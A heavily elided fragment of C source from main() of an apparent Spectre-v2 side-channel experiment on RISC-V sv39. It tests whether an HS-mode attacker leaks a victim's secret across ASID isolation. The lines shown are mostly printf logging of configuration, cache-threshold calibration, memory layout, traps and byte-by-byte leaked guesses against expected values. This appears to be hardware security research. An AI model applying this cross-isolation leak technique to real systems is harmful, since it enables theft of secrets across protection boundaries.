...
int main(void)
{
...
#if !SMOKE_FAST_BOOT
  printf("[v2-hs-sv39] model=sv39-asid-hs-isolation attacker=HS victim=HS service=machine-scheduler attacker_asid=%lu victim_asid=%lu normalized_attacker_asid=%lu normalized_victim_asid=%lu fence_on_switch=%d baseline_subtract=%d filter_known_noise=%d secret_sz=%d candidates=%d tries=%d train=%d warmup=%d asm_control=%d probe_control=%d probe_mix=%d early_strict=%d asm_style=%d flush_lines=%d control_only=%d\n",
         ...
         SECRET_SZ, PROBE_CANDIDATES, V2_ATTACK_TRIES, V2_TRAINING_LOOPS,
         V2_BYTE_WARMUP_ROUNDS, V2_ASM_CONTROL_ROUND, V2_PROBE_CONTROL_ROUND,
         V2_PROBE_MIX, V2_EARLY_STOP_STRICT, V2_ASM_STYLE, FLUSH_LINES, CONTROL_ONLY);
  printf("[v2-hs-sv39] secret_offset=%d\n", SECRET_OFFSET);
  printf("[v2-hs-sv39] calibration fallback=%d measured=%lu threshold=%lu fixed=%d\n",
         CACHE_HIT_THRESHOLD, measured_threshold, active_threshold,
         USE_FIXED_CACHE_HIT_THRESHOLD);
  printf("[v2-hs-sv39] isolation attacker_direct_victim_secret=expect-fault shared_probe=mapped-both victim_data=mapped-victim-only\n");
  printf("[v2-hs-sv39] victim_secret=%p probe=%p gadget=%p safe_target=%p\n",
  ...
  printf("[v2-hs-sv39] isolation HS-direct-victim-read fault_seen=%lu completed=%lu value=0x%02lx u_text=[%p,%p) a_data=[%p,%p) shared=[%p,%p) v_data=[%p,%p)\n",
  ...
  printf("[v2-hs-sv39] satp requested_attacker=0x%lx requested_victim=0x%lx observed_attacker=0x%lx observed_victim=0x%lx asid_mask=0x%lx mode=sv39\n",
         attacker_space.satp, victim_space.satp,
         observed_attacker_satp, observed_victim_satp, SATP_ASID_MASK);
  printf("[v2-hs-sv39] traps=%lu victim_calls=%lu victim_done=%lu flush_calls=%lu exit_calls=%lu bad_traps=%lu last_mcause=%lu last_mepc=%p status=%d\n",
  ...
  for (uint64_t i = 0; i < SECRET_SZ; ++i) {
    ...
    printf("[v2-hs-sv39] byte %lu: expected=%c(0x%02x) guess=%c(0x%02x) score=%lu second=%c(0x%02x) score=%lu\n",
           i,
           expected, expected,
           (guess >= 32 && guess < 127) ? guess : '?', guess, leaked_score[i][0],
           (second >= 32 && second < 127) ? second : '?', second, leaked_score[i][1]);
    printf("[v2-hs-sv39] byte %lu tries=%lu early_stop=%d min_score=%d gap=%d\n",
           i, rounds_used[i], EARLY_STOP, EARLY_STOP_MIN_SCORE, EARLY_STOP_GAP);
    printf("[v2-hs-sv39] byte %lu top4=%c(0x%02x):%lu,%c(0x%02x):%lu,%c(0x%02x):%lu,%c(0x%02x):%lu\n",
           i,
